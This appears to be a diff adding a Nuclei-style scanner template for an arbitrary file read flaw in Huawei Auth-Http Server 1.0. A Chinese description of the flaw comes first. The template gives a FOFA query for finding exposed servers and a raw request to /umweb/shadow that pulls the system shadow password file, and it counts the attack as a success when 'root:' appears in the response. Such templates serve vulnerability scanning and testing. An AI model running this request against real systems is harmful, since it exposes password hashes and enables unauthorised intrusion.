@@ -1,0 +1,31 @@
+id: huawei-auth-http-umweb-fileread
+info:
+  name: 华为Auth-Http Serve任意文件读取
+  author: leadlife
+  severity: high
+  description: 华为Auth-Http服务,华为Auth-Http Server是一款安全认证服务器，在提供安全的远程登录和网络资源访问控制。支持多种认证方式和协议AAA、Radius、TACACS+等，可以实现用户身份认证、授权和审计等功能。同时，可广泛应用于企业、政府、教育等行业的安全架构中。华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件
+  reference: 
+    - https://github.com/wy876/POC/blob/31a1d029b89778347a04f3e5c3d2f400259cc10d/%E5%8D%8E%E4%B8%BAAuth-Http%20Serve/%E5%8D%8E%E4%B8%BAAuth-Http%20Serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: server="Huawei Auth-Http Server 1.0"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,huawei,auth-http,fileread
+
+http:
+  - raw:
+      - |
+        GET /umweb/shadow HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'root:')
+        condition: and
